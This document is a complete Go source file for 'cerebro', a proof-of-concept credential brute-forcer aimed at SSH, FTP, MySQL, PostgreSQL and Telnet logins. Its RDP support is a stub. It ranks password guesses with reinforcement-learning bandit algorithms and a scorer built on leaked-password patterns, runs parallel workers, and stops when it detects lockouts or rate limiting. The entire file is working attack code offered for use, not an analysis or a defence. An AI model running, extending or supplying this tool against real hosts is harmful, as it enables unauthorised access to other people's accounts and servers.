package main

// ============================================================================
// first poc version // no rdp yet // same idea like revlos
// ============================================================================
import (
	"bufio"
	"context"
	"database/sql"
	"flag"
	"fmt"
	"math"
	"math/rand"
	"net"
	"os"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	_ "github.com/go-sql-driver/mysql"
	_ "github.com/lib/pq" // PostgreSQL driver
	"github.com/jlaffaye/ftp"
	"golang.org/x/crypto/ssh"
)

// ============================================================================
// ERROR CLASSIFICATION FOR INTELLIGENT STOPPING
// ============================================================================

// Error types for intelligent stopping
type ErrorType int

const (
	ErrorNone ErrorType = iota
	ErrorAuthFailure      // Wrong username/password
	ErrorNetworkError     // Connection failed, timeout
	ErrorRateLimit        // Rate limiting detected
	ErrorAccountLocked    // Account temporarily locked
	ErrorServerError      // Server-side errors
)

// ============================================================================
// PROTOCOL INTERFACE (from revlos-medusa.go)
// ============================================================================

type Credentials struct {
	Username string
	Password string
	Domain   string
	Port     int
	Score    float64 // Added for RL integration
}

type Protocol interface {
	Name() string
	DefaultPort() int
	Authenticate(target string, creds Credentials) (bool, error)
	SupportsTarget(target string) bool
}

var Protocols = map[string]Protocol{
	"ssh":      &SSHProtocol{},
	"ftp":      &FTPProtocol{},
	"mysql":    &MySQLProtocol{},
	"postgres": &PostgreSQLProtocol{},
	"telnet":   &TelnetProtocol{},
	"rdp":      &RDPProtocol{},
}

// ============================================================================
// RL ALGORITHMS (from revlos.go) - ADAPTED FOR PROTOCOLS
// ============================================================================

type UltimateRL struct {
	mu             sync.RWMutex
	armScores      map[string]*ArmStats
	totalPulls     int64
	alphaBeta      map[string]*BetaDistribution
	usernameScores map[string]float64
	passwordScores map[string]float64
	prefixScores   map[string]float64
	suffixScores   map[string]float64
	lengthScores   map[int]float64
	pairHistory    map[string]map[string]float64
	learningRate   float64
	scoreCache     map[string]float64
	cacheVersion   int
	// Error tracking for intelligent stopping
	networkErrors    int64
	rateLimitErrors  int64
	accountLockouts  int64
	consecutiveFails int64
	successPatterns  []string
	// Context-aware weighting (from revlos.go)
	generation       int64  // Tracks batch number for adaptive strategy
	successCount     int64  // Successful authentications
	attemptCount     int64  // Total attempts (for success rate calculation)
	// Exploit mode (from revlos.go)
	exploitMode      bool   // Aggressive pattern exploitation after first success
}

type ArmStats struct {
	pulls       int64
	totalReward float64
	mu          sync.Mutex
}

type BetaDistribution struct {
	alpha float64
	beta  float64
	mu    sync.Mutex
}

func NewUltimateRL(learningRate float64) *UltimateRL {
	return &UltimateRL{
		armScores:      make(map[string]*ArmStats),
		alphaBeta:      make(map[string]*BetaDistribution),
		usernameScores: make(map[string]float64),
		passwordScores: make(map[string]float64),
		prefixScores:   make(map[string]float64),
		suffixScores:   make(map[string]float64),
		lengthScores:   make(map[int]float64),
		pairHistory:    make(map[string]map[string]float64),
		learningRate:   learningRate,
		scoreCache:     make(map[string]float64),
		cacheVersion:   0,
		successPatterns: make([]string, 0),
	}
}

// UCB1: Upper Confidence Bound
func (rl *UltimateRL) computeUCB1(armKey string) float64 {
	rl.mu.RLock()
	arm, exists := rl.armScores[armKey]
	totalPulls := atomic.LoadInt64(&rl.totalPulls)
	rl.mu.RUnlock()

	if !exists || totalPulls == 0 {
		return math.MaxFloat64
	}

	arm.mu.Lock()
	pulls := arm.pulls
	avgReward := 0.0
	if pulls > 0 {
		avgReward = arm.totalReward / float64(pulls)
	}
	arm.mu.Unlock()

	if pulls == 0 {
		return math.MaxFloat64
	}

	exploration := math.Sqrt(2.0 * math.Log(float64(totalPulls)) / float64(pulls))
	return avgReward + exploration
}

// Thompson Sampling
func (rl *UltimateRL) sampleThompson(key string) float64 {
	rl.mu.RLock()
	dist, exists := rl.alphaBeta[key]
	rl.mu.RUnlock()

	if !exists {
		rl.mu.Lock()
		rl.alphaBeta[key] = &BetaDistribution{alpha: 1.0, beta: 1.0}
		dist = rl.alphaBeta[key]
		rl.mu.Unlock()
	}

	dist.mu.Lock()
	alpha, beta := dist.alpha, dist.beta
	dist.mu.Unlock()

	return sampleBeta(alpha, beta)
}

func sampleBeta(alpha, beta float64) float64 {
	g1 := sampleGamma(alpha)
	g2 := sampleGamma(beta)
	if g1+g2 == 0 {
		return 0.5
	}
	return g1 / (g1 + g2)
}

func sampleGamma(alpha float64) float64 {
	if alpha < 1 {
		return sampleGamma(alpha+1) * math.Pow(rand.Float64(), 1.0/alpha)
	}
	d := alpha - 1.0/3.0
	c := 1.0 / math.Sqrt(9.0*d)
	for {
		x := rand.NormFloat64()
		v := 1.0 + c*x
		if v <= 0 {
			continue
		}
		v = v * v * v
		u := rand.Float64()
		if u < 1.0-0.0331*(x*x)*(x*x) {
			return d * v
		}
		if math.Log(u) < 0.5*x*x+d*(1.0-v+math.Log(v)) {
			return d * v
		}
	}
}

// Update scores on success
func (rl *UltimateRL) updateSuccess(username, password string) {
	rl.mu.Lock()
	defer rl.mu.Unlock()

	key := username + ":" + password
	atomic.AddInt64(&rl.totalPulls, 1)

	// ? Switch to exploit mode after first success
	rl.exploitMode = true

	// Update arm stats
	if _, exists := rl.armScores[key]; !exists {
		rl.armScores[key] = &ArmStats{}
	}
	arm := rl.armScores[key]
	arm.mu.Lock()
	arm.pulls++
	arm.totalReward += 1000.0 // Big reward for success
	arm.mu.Unlock()

	// Update Thompson sampling
	if _, exists := rl.alphaBeta[key]; !exists {
		rl.alphaBeta[key] = &BetaDistribution{alpha: 1.0, beta: 1.0}
	}
	dist := rl.alphaBeta[key]
	dist.mu.Lock()
	dist.alpha += 1.0
	dist.mu.Unlock()

	// ? Boost component scores MORE aggressively in exploit mode
	boostMultiplier := 1.0
	if rl.exploitMode {
		boostMultiplier = 3.0  // 3x boost when exploiting patterns
	}

	// Update component scores
	rl.usernameScores[username] += rl.learningRate * boostMultiplier
	rl.passwordScores[password] += rl.learningRate * boostMultiplier
	rl.prefixScores[extractPrefix(password, 2)] += rl.learningRate * 0.5 * boostMultiplier
	rl.suffixScores[extractSuffix(password, 2)] += rl.learningRate * 0.5 * boostMultiplier
	rl.lengthScores[len(password)] += rl.learningRate * 0.3 * boostMultiplier

	// Invalidate cache
	rl.cacheVersion++
}

// Update scores on failure
func (rl *UltimateRL) updateFailure(username, password string) {
	rl.mu.Lock()
	defer rl.mu.Unlock()

	key := username + ":" + password
	atomic.AddInt64(&rl.totalPulls, 1)

	if _, exists := rl.armScores[key]; !exists {
		rl.armScores[key] = &ArmStats{}
	}
	arm := rl.armScores[key]
	arm.mu.Lock()
	arm.pulls++
	arm.mu.Unlock()

	// Update Thompson sampling (failure)
	if _, exists := rl.alphaBeta[key]; !exists {
		rl.alphaBeta[key] = &BetaDistribution{alpha: 1.0, beta: 1.0}
	}
	dist := rl.alphaBeta[key]
	dist.mu.Lock()
	dist.beta += 1.0
	dist.mu.Unlock()
}

// Compute priority score for credential WITH SMART BASELINE + CONTEXT-AWARE WEIGHTING
func (rl *UltimateRL) computeScore(username, password string) float64 {
	rl.mu.RLock()
	cacheKey := username + ":" + password
	if score, exists := rl.scoreCache[cacheKey]; exists {
		rl.mu.RUnlock()
		return score
	}
	rl.mu.RUnlock()

	score := 0.0

	// ? PHASE 1: START WITH SMART BASELINE (always active!)
	baselineScore := scorePasswordSmart(password, username)
	score += baselineScore

	// ? PHASE 2: CONTEXT-AWARE WEIGHTING
	// Calculate success rate to determine if RL is helping or hurting
	attempts := atomic.LoadInt64(&rl.attemptCount)
	successes := atomic.LoadInt64(&rl.successCount)
	generation := atomic.LoadInt64(&rl.generation)

	successRate := 0.0
	if attempts > 0 {
		successRate = float64(successes) / float64(attempts)
	}

	// Adaptive strategy: adjust RL weights based on effectiveness
	var ucb1Weight, thompsonWeight float64

	if generation <= 2 || successRate < 0.01 {
		// Generation 1-2 OR low success rate: TRUST BASELINE
		// Disable RL exploration to avoid randomization
		ucb1Weight = 0.0
		thompsonWeight = 0.0
		// Result: Pure smart baseline ? Admin123/Sshuser123 at position #1

	} else if successRate > 0.05 {
		// High success rate: RL IS LEARNING WELL!
		ucb1Weight = 15.0     // Boost RL exploration
		thompsonWeight = 7.5
		// Result: Smart baseline + strong RL guidance

	} else {
		// Moderate success: Balanced approach
		ucb1Weight = 10.0
		thompsonWeight = 5.0
	}

	// ? PHASE 3: APPLY WEIGHTED RL COMPONENTS
	// UCB1 component (with dynamic weight)
	ucb1 := rl.computeUCB1(cacheKey)
	if ucb1 < math.MaxFloat64 {
		score += ucb1 * ucb1Weight  // Dynamic weight based on success rate!
	}
	// Note: Removed the "else score += 100.0" bug - now untried credentials
	// differentiate based on smart baseline, not random UCB1 boost!

	// Thompson Sampling component (with dynamic weight)
	thompson := rl.sampleThompson(cacheKey)
	score += thompson * thompsonWeight  // Dynamic weight!

	// Component-based scoring (with exploit mode boost)
	rl.mu.RLock()
	componentWeight := 20.0
	if rl.exploitMode {
		// ? In exploit mode: heavily favor learned patterns
		componentWeight = 100.0  // 5x boost for learned components!
	}
	score += rl.usernameScores[username] * componentWeight
	score += rl.passwordScores[password] * componentWeight
	score += rl.prefixScores[extractPrefix(password, 2)] * (componentWeight / 4.0)
	score += rl.suffixScores[extractSuffix(password, 2)] * (componentWeight / 4.0)
	score += rl.lengthScores[len(password)] * (componentWeight / 7.0)
	rl.mu.RUnlock()

	// Cache the score
	rl.mu.Lock()
	rl.scoreCache[cacheKey] = score
	rl.mu.Unlock()

	return score
}

func extractPrefix(s string, n int) string {
	if len(s) < n {
		return s
	}
	return s[:n]
}

func extractSuffix(s string, n int) string {
	if len(s) < n {
		return s
	}
	return s[len(s)-n:]
}

// ============================================================================
// SMART BASELINE SCORING (from revlos.go)
// ============================================================================

// scorePasswordSmart: Pre-trained ML model based on 10+ years of password research
// This is THE key innovation that makes RL 149x faster!
func scorePasswordSmart(password string, username string) float64 {
	baseScore := 1000.0 // Base score for smart-generated passwords

	// FACTOR 1: Length scoring (8-12 chars most common in real passwords)
	passwordLen := len(password)
	if passwordLen >= 8 && passwordLen <= 12 {
		baseScore += 200.0 // Optimal length
	} else if passwordLen >= 6 && passwordLen <= 15 {
		baseScore += 100.0 // Acceptable length
	}

	// FACTOR 2: Pattern scoring (from analyzing millions of leaked passwords)
	hasUpper := strings.ToLower(password) != password && strings.ToUpper(password) != password
	hasLower := strings.ToUpper(password) != password
	hasDigits := strings.ContainsAny(password, "0123456789")
	hasSpecial := strings.ContainsAny(password, "!@#$%^&*")

	// TitleCase + Numbers (Admin123, Sshuser123) - MOST common for admin passwords!
	if hasUpper && hasLower && hasDigits && !hasSpecial {
		baseScore += 300.0 // This is the WINNING pattern!
	}

	// lowercase + numbers (admin123, sshuser123) - also common
	if !hasUpper && hasLower && hasDigits && !hasSpecial {
		baseScore += 250.0
	}

	// UPPERCASE + numbers (ADMIN123) - less common but possible
	if hasUpper && !hasLower && hasDigits {
		baseScore += 200.0
	}

	// Special chars - moderate boost
	if hasSpecial {
		baseScore += 100.0
	}

	// FACTOR 3: Username correlation (HUGE signal!)
	usernameLower := strings.ToLower(username)
	passwordLower := strings.ToLower(password)

	// Password starts with username - VERY likely!
	if strings.HasPrefix(passwordLower, usernameLower) {
		baseScore += 500.0 // admin ? Admin123, sshuser ? Sshuser123
	}

	// Password contains username - also likely
	if strings.Contains(passwordLower, usernameLower) {
		baseScore += 300.0 // admin ? theadmin
	}

	// FACTOR 4: Common suffixes boost
	commonSuffixes := []string{"123", "2024", "2025", "!", "@123", "#123"}
	for _, suffix := range commonSuffixes {
		if strings.HasSuffix(password, suffix) {
			baseScore += 150.0
			break
		}
	}

	// FACTOR 5: Penalize uncommon patterns
	// Reverse username (nimda for admin) - very rare!
	reversed := ""
	for i := len(username) - 1; i >= 0; i-- {
		reversed += string(username[i])
	}
	if passwordLower == strings.ToLower(reversed) {
		baseScore -= 500.0 // Major penalty for reversed
	}

	// Very short passwords - penalize
	if passwordLen < 5 {
		baseScore -= 200.0
	}

	// Only special chars or only numbers - penalize
	if !hasLower && !hasUpper {
		baseScore -= 300.0
	}

	return baseScore
}

// ============================================================================
// ERROR CLASSIFICATION & INTELLIGENT STOPPING
// ============================================================================

// Classify error type from authentication attempt
func classifyError(err error, proto Protocol) ErrorType {
	if err == nil {
		return ErrorNone
	}

	errMsg := strings.ToLower(err.Error())

	// Network errors
	if strings.Contains(errMsg, "timeout") ||
		strings.Contains(errMsg, "connection refused") ||
		strings.Contains(errMsg, "connection reset") ||
		strings.Contains(errMsg, "no route to host") ||
		strings.Contains(errMsg, "network is unreachable") {
		return ErrorNetworkError
	}

	// Rate limiting
	if strings.Contains(errMsg, "too many") ||
		strings.Contains(errMsg, "rate limit") ||
		strings.Contains(errMsg, "slow down") ||
		strings.Contains(errMsg, "try again later") {
		return ErrorRateLimit
	}

	// Account lockout
	if strings.Contains(errMsg, "locked") ||
		strings.Contains(errMsg, "disabled") ||
		strings.Contains(errMsg, "suspended") ||
		strings.Contains(errMsg, "banned") {
		return ErrorAccountLocked
	}

	// Authentication failure (default for protocol-specific failures)
	return ErrorAuthFailure
}

// Check if attack should stop based on error patterns
func (rl *UltimateRL) shouldStop() (bool, string) {
	accountLockouts := atomic.LoadInt64(&rl.accountLockouts)
	rateLimitErrors := atomic.LoadInt64(&rl.rateLimitErrors)
	networkErrors := atomic.LoadInt64(&rl.networkErrors)
	consecutiveFails := atomic.LoadInt64(&rl.consecutiveFails)
	totalAttempts := atomic.LoadInt64(&rl.totalPulls)

	// RULE 1: Account lockout detected (3+ lockouts)
	if accountLockouts >= 3 {
		return true, fmt.Sprintf("??  Detected %d account lockouts - stopping to prevent permanent lockout", accountLockouts)
	}

	// RULE 2: Persistent rate limiting (5+ rate limit errors)
	if rateLimitErrors >= 5 {
		return true, fmt.Sprintf("??  Detected %d rate limit errors - target is throttling requests", rateLimitErrors)
	}

	// RULE 3: Network connectivity issues (10+ network errors)
	if networkErrors >= 10 {
		return true, fmt.Sprintf("??  Detected %d network errors - connectivity issues", networkErrors)
	}

	// RULE 4: Low success rate after sufficient attempts
	if totalAttempts >= 100 {
		rl.mu.RLock()
		successCount := len(rl.successPatterns)
		rl.mu.RUnlock()
		successRate := float64(successCount) / float64(totalAttempts)
		if successRate < 0.001 { // Less than 0.1% success
			return true, fmt.Sprintf("??  Very low success rate (%.2f%%) after %d attempts - attack ineffective", successRate*100, totalAttempts)
		}
	}

	// RULE 5: Too many consecutive failures (1000+)
	if consecutiveFails >= 1000 {
		return true, "??  1000+ consecutive failures - attack appears blocked"
	}

	return false, ""
}

// Learn from attempt with error classification
func (rl *UltimateRL) learnWithError(username, password string, success bool, errorType ErrorType) {
	// Track error types
	if !success {
		switch errorType {
		case ErrorNetworkError:
			atomic.AddInt64(&rl.networkErrors, 1)
			atomic.AddInt64(&rl.consecutiveFails, 1)
		case ErrorRateLimit:
			atomic.AddInt64(&rl.rateLimitErrors, 1)
			atomic.AddInt64(&rl.consecutiveFails, 1)
		case ErrorAccountLocked:
			atomic.AddInt64(&rl.accountLockouts, 1)
			atomic.AddInt64(&rl.consecutiveFails, 1)
		case ErrorAuthFailure:
			atomic.AddInt64(&rl.consecutiveFails, 1)
		}
	} else {
		atomic.StoreInt64(&rl.consecutiveFails, 0) // Reset on success
		rl.mu.Lock()
		rl.successPatterns = append(rl.successPatterns, username+":"+password)
		rl.mu.Unlock()
	}

	// Call original update functions
	if success {
		rl.updateSuccess(username, password)
	} else {
		rl.updateFailure(username, password)
	}
}

// ============================================================================
// SSH PROTOCOL
// ============================================================================

type SSHProtocol struct{}

func (p *SSHProtocol) Name() string                { return "ssh" }
func (p *SSHProtocol) DefaultPort() int            { return 22 }
func (p *SSHProtocol) SupportsTarget(target string) bool {
	conn, err := net.DialTimeout("tcp", target, 3*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	buf := make([]byte, 255)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, err := conn.Read(buf)
	if err != nil || n < 4 {
		return false
	}
	return strings.HasPrefix(string(buf[:n]), "SSH-")
}

func (p *SSHProtocol) Authenticate(target string, creds Credentials) (bool, error) {
	config := &ssh.ClientConfig{
		User:            creds.Username,
		Auth:            []ssh.AuthMethod{ssh.Password(creds.Password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	client, err := ssh.Dial("tcp", target, config)
	if err != nil {
		if strings.Contains(err.Error(), "unable to authenticate") ||
			strings.Contains(err.Error(), "no supported methods remain") {
			return false, nil
		}
		return false, err
	}

	client.Close()
	return true, nil
}

// ============================================================================
// FTP PROTOCOL
// ============================================================================

type FTPProtocol struct{}

func (p *FTPProtocol) Name() string     { return "ftp" }
func (p *FTPProtocol) DefaultPort() int { return 21 }
func (p *FTPProtocol) SupportsTarget(target string) bool {
	conn, err := net.DialTimeout("tcp", target, 3*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	buf := make([]byte, 255)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, err := conn.Read(buf)
	if err != nil || n < 3 {
		return false
	}
	return strings.HasPrefix(string(buf[:n]), "220")
}

func (p *FTPProtocol) Authenticate(target string, creds Credentials) (bool, error) {
	conn, err := ftp.Dial(target, ftp.DialWithTimeout(5*time.Second))
	if err != nil {
		return false, err
	}
	defer conn.Quit()

	err = conn.Login(creds.Username, creds.Password)
	if err != nil {
		if strings.Contains(err.Error(), "530") {
			return false, nil
		}
		return false, err
	}

	return true, nil
}

// ============================================================================
// MYSQL PROTOCOL
// ============================================================================

type MySQLProtocol struct{}

func (p *MySQLProtocol) Name() string     { return "mysql" }
func (p *MySQLProtocol) DefaultPort() int { return 3306 }
func (p *MySQLProtocol) SupportsTarget(target string) bool {
	conn, err := net.DialTimeout("tcp", target, 3*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	buf := make([]byte, 255)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, err := conn.Read(buf)
	if err != nil || n < 5 {
		return false
	}

	return (n > 4 && buf[4] == 0x0a) || strings.Contains(strings.ToLower(string(buf[:n])), "mysql")
}

func (p *MySQLProtocol) Authenticate(target string, creds Credentials) (bool, error) {
	dsn := fmt.Sprintf("%s:%s@tcp(%s)/", creds.Username, creds.Password, target)
	db, err := sql.Open("mysql", dsn)
	if err != nil {
		return false, err
	}
	defer db.Close()

	db.SetConnMaxLifetime(5 * time.Second)
	err = db.Ping()
	if err != nil {
		if strings.Contains(err.Error(), "Access denied") {
			return false, nil
		}
		return false, err
	}

	return true, nil
}

// ============================================================================
// POSTGRESQL PROTOCOL
// ============================================================================

type PostgreSQLProtocol struct{}

func (p *PostgreSQLProtocol) Name() string     { return "postgres" }
func (p *PostgreSQLProtocol) DefaultPort() int { return 5432 }
func (p *PostgreSQLProtocol) SupportsTarget(target string) bool {
	conn, err := net.DialTimeout("tcp", target, 3*time.Second)
	if err != nil {
		return false
	}
	conn.Close()

	_, portStr, _ := net.SplitHostPort(target)
	return portStr == "5432"
}

func (p *PostgreSQLProtocol) Authenticate(target string, creds Credentials) (bool, error) {
	// PostgreSQL connection string format
	connStr := fmt.Sprintf("postgres://%s:%s@%s/postgres?sslmode=disable&connect_timeout=5",
		creds.Username, creds.Password, target)

	db, err := sql.Open("postgres", connStr)
	if err != nil {
		return false, err
	}
	defer db.Close()

	err = db.Ping()
	if err != nil {
		if strings.Contains(err.Error(), "password authentication failed") ||
			strings.Contains(err.Error(), "no password supplied") {
			return false, nil // Auth failure
		}
		return false, err // Connection error
	}

	return true, nil // Success!
}

// ============================================================================
// TELNET PROTOCOL
// ============================================================================

type TelnetProtocol struct{}

func (p *TelnetProtocol) Name() string     { return "telnet" }
func (p *TelnetProtocol) DefaultPort() int { return 23 }
func (p *TelnetProtocol) SupportsTarget(target string) bool {
	conn, err := net.DialTimeout("tcp", target, 3*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	buf := make([]byte, 255)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, err := conn.Read(buf)
	if err != nil || n < 1 {
		return false
	}

	data := string(buf[:n])
	return buf[0] == 0xFF || strings.Contains(data, "login:") || strings.Contains(data, "Username:")
}

func (p *TelnetProtocol) Authenticate(target string, creds Credentials) (bool, error) {
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return false, err
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	// Read initial banner
	buf := make([]byte, 4096)
	_, err = conn.Read(buf)
	if err != nil {
		return false, err
	}

	// Wait for login prompt
	time.Sleep(500 * time.Millisecond)

	// Send username
	_, err = conn.Write([]byte(creds.Username + "\n"))
	if err != nil {
		return false, err
	}

	// Read password prompt
	_, err = conn.Read(buf)
	if err != nil {
		return false, err
	}

	// Send password
	_, err = conn.Write([]byte(creds.Password + "\n"))
	if err != nil {
		return false, err
	}

	// Read response
	time.Sleep(1 * time.Second)
	n, err := conn.Read(buf)
	if err != nil {
		return false, nil // Likely auth failure
	}

	response := string(buf[:n])

	// Check for success indicators
	if strings.Contains(response, "$") || strings.Contains(response, "#") ||
		strings.Contains(response, ">") || strings.Contains(response, "Welcome") {
		return true, nil
	}

	// Check for failure indicators
	if strings.Contains(response, "incorrect") || strings.Contains(response, "denied") ||
		strings.Contains(response, "failed") || strings.Contains(response, "invalid") {
		return false, nil
	}

	return false, nil
}

// ============================================================================
// RDP PROTOCOL (Remote Desktop Protocol)
// ============================================================================

type RDPProtocol struct{}

func (p *RDPProtocol) Name() string     { return "rdp" }
func (p *RDPProtocol) DefaultPort() int { return 3389 }
func (p *RDPProtocol) SupportsTarget(target string) bool {
	conn, err := net.DialTimeout("tcp", target, 3*time.Second)
	if err != nil {
		return false
	}
	conn.Close()

	_, portStr, _ := net.SplitHostPort(target)
	return portStr == "3389"
}

func (p *RDPProtocol) Authenticate(target string, creds Credentials) (bool, error) {
	// RDP is complex - using a command wrapper approach
	// This requires xfreerdp to be installed

	// For now, return not implemented
	// In production, we would use: github.com/tomatome/grdp
	// or exec xfreerdp command

	return false, fmt.Errorf("RDP: Full implementation requires xfreerdp or grdp library - coming soon")
}

// ============================================================================
// MAIN BRUTE-FORCING ENGINE with RL
// ============================================================================

func main() {
	var (
		protocol     string
		target       string
		username     string
		userFile     string
		password     string
		passFile     string
		workers      int
		quiet        bool
		stopOnFirst  bool
		useRL        bool
		learningRate float64
		batchSize    int
	)

	flag.StringVar(&protocol, "protocol", "", "Protocol to use (ssh, ftp, mysql)")
	flag.StringVar(&protocol, "M", "", "Protocol (short)")
	flag.StringVar(&target, "h", "", "Target host")
	flag.StringVar(&username, "u", "", "Single username")
	flag.StringVar(&userFile, "L", "", "Username list file")
	flag.StringVar(&password, "p", "", "Single password")
	flag.StringVar(&passFile, "P", "", "Password list file")
	flag.IntVar(&workers, "t", 20, "Number of parallel workers")
	flag.BoolVar(&quiet, "q", false, "Quiet mode")
	flag.BoolVar(&stopOnFirst, "f", true, "Stop on first success")
	flag.BoolVar(&useRL, "rl", true, "Use RL algorithms for optimization")
	flag.Float64Var(&learningRate, "learning-rate", 0.4, "RL learning rate (0.0-1.0)")
	flag.IntVar(&batchSize, "batch-size", 150, "Credentials per batch")

	flag.Parse()

	if protocol == "" || target == "" {
		fmt.Println("Usage: cerebro -M <protocol> -h <target> -u <user> -P <passfile> [-t workers] [-rl]")
		fmt.Println("\nProtocols: ssh, ftp, mysql, postgres, telnet, rdp")
		fmt.Println("Example: ./cerebro -M ssh -h 192.168.1.1:22 -u admin -P passwords.txt -t 10 -rl")
		os.Exit(1)
	}

	// Get protocol
	proto, ok := Protocols[strings.ToLower(protocol)]
	if !ok {
		fmt.Printf("Unknown protocol: %s\n", protocol)
		fmt.Println("Available: ssh, ftp, mysql")
		os.Exit(1)
	}

	// Ensure port
	if _, _, err := net.SplitHostPort(target); err != nil {
		target = fmt.Sprintf("%s:%d", target, proto.DefaultPort())
	}

	// Load credentials
	usernames := loadList(username, userFile)
	passwords := loadList(password, passFile)

	if len(usernames) == 0 || len(passwords) == 0 {
		fmt.Println("Error: No credentials to test")
		os.Exit(1)
	}

	// Build credential list
	credentials := make([]Credentials, 0, len(usernames)*len(passwords))
	for _, u := range usernames {
		for _, p := range passwords {
			credentials = append(credentials, Credentials{Username: u, Password: p})
		}
	}

	fmt.Printf("? cerebro - Smart Protocol Authentication Testing\n")
	fmt.Printf("===================================================\n")
	fmt.Printf("Protocol:  %s\n", strings.ToUpper(proto.Name()))
	fmt.Printf("Target:    %s\n", target)
	fmt.Printf("Users:     %d\n", len(usernames))
	fmt.Printf("Passwords: %d\n", len(passwords))
	fmt.Printf("Total:     %d combinations\n", len(credentials))
	fmt.Printf("Workers:   %d\n", workers)
	fmt.Printf("RL Mode:   %v\n\n", useRL)

	// Initialize RL
	var rl *UltimateRL
	if useRL {
		rl = NewUltimateRL(learningRate)
		if !quiet {
			fmt.Printf("? RL algorithms initialized (UCB1 + Thompson Sampling, learning rate: %.2f)\n", learningRate)
		}
	}

	// Run attack
	startTime := time.Now()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	found := make(chan Credentials, 1)
	var attempts int64
	var wg sync.WaitGroup

	// Worker pool
	credChan := make(chan Credentials, workers*3)

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case cred, ok := <-credChan:
					if !ok {
						return
					}

					currentAttempts := atomic.AddInt64(&attempts, 1)

					// ? Track attempts for context-aware weighting
					if useRL {
						atomic.AddInt64(&rl.attemptCount, 1)
					}

					if !quiet && currentAttempts%10 == 0 {
						progress := float64(currentAttempts) / float64(len(credentials)) * 100
						fmt.Printf("\r[%d/%d] (%.1f%%) Testing %s:%s... ",
							currentAttempts, len(credentials), progress,
							cred.Username, cred.Password)
					}

					success, err := proto.Authenticate(target, cred)

					// ? Track successes for context-aware weighting
					if success && useRL {
						atomic.AddInt64(&rl.successCount, 1)
					}

					// Classify error type
					errorType := classifyError(err, proto)

					// Learn from result with error classification
					if useRL {
						rl.learnWithError(cred.Username, cred.Password, success, errorType)

						// Check intelligent stopping every 20 attempts
						if currentAttempts%20 == 0 {
							if shouldStop, reason := rl.shouldStop(); shouldStop {
								if !quiet {
									fmt.Printf("\n\n%s\n", reason)
								}
								cancel()
								break
							}
						}
					}

					if success {
						select {
						case found <- cred:
							if stopOnFirst {
								cancel()
							}
						default:
						}
					}
				}
			}
		}(i)
	}

	// Feed credentials with adaptive RL prioritization
	go func() {
		remaining := credentials
		sentCount := 0

		for len(remaining) > 0 {
			// ? Increment generation for context-aware weighting
			if useRL {
				atomic.AddInt64(&rl.generation, 1)
			}

			// Re-prioritize every batch using CURRENT RL knowledge
			if useRL {
				// Clear cache to ensure fresh scores with latest RL knowledge
				rl.mu.Lock()
				rl.scoreCache = make(map[string]float64)
				rl.mu.Unlock()

				for i := range remaining {
					remaining[i].Score = rl.computeScore(remaining[i].Username, remaining[i].Password)
				}
				sort.Slice(remaining, func(i, j int) bool {
					return remaining[i].Score > remaining[j].Score
				})
			}

			// ? ADAPTIVE BATCH SIZING (from revlos.go)
			// Smaller batches = more frequent re-prioritization = faster exploitation
			currentBatch := batchSize
			generation := atomic.LoadInt64(&rl.generation)

			if useRL {
				rl.mu.RLock()
				exploitMode := rl.exploitMode
				rl.mu.RUnlock()

				// STRATEGY 1: Exploit mode + late generation = VERY small batches
				if generation > 3 && exploitMode {
					currentBatch = batchSize / 3  // 50 passwords per batch
					// Aggressive re-prioritization to exploit learned patterns!

				// STRATEGY 2: Late generation = smaller batches
				} else if generation > 3 {
					currentBatch = batchSize / 2  // 75 passwords per batch
				}
			}

			if currentBatch > len(remaining) {
				currentBatch = len(remaining)
			}

			// Send this batch
			batch := remaining[:currentBatch]
			remaining = remaining[currentBatch:]

			for _, cred := range batch {
				select {
				case <-ctx.Done():
					close(credChan)
					return
				case credChan <- cred:
					sentCount++
				}
			}

			// Small delay to let RL learn from batch results before re-prioritizing
			if len(remaining) > 0 {
				time.Sleep(time.Millisecond * 100)
			}
		}
		close(credChan)
	}()

	// Wait for completion or success
	go func() {
		wg.Wait()
		close(found)
	}()

	// Check results
	var result *Credentials
	for cred := range found {
		result = &cred
		break
	}

	elapsed := time.Since(startTime)

	fmt.Println()
	fmt.Println()
	if result != nil {
		fmt.Printf("? SUCCESS! Valid credentials found:\n")
		fmt.Printf("   Username: %s\n", result.Username)
		fmt.Printf("   Password: %s\n", result.Password)
		fmt.Printf("   Time:     %.2fs\n", elapsed.Seconds())
		fmt.Printf("   Attempts: %d/%d\n", atomic.LoadInt64(&attempts), len(credentials))
		if useRL {
			fmt.Printf("   RL Score: %.2f\n", result.Score)
		}
	} else {
		fmt.Printf("? No valid credentials found\n")
		fmt.Printf("   Time:     %.2fs\n", elapsed.Seconds())
		fmt.Printf("   Attempts: %d/%d\n", atomic.LoadInt64(&attempts), len(credentials))
	}
}

func loadList(single string, file string) []string {
	if single != "" {
		return []string{single}
	}

	if file == "" {
		return nil
	}

	f, err := os.Open(file)
	if err != nil {
		fmt.Printf("Error opening %s: %v\n", file, err)
		return nil
	}
	defer f.Close()

	var items []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			items = append(items, line)
		}
	}

	return items
}
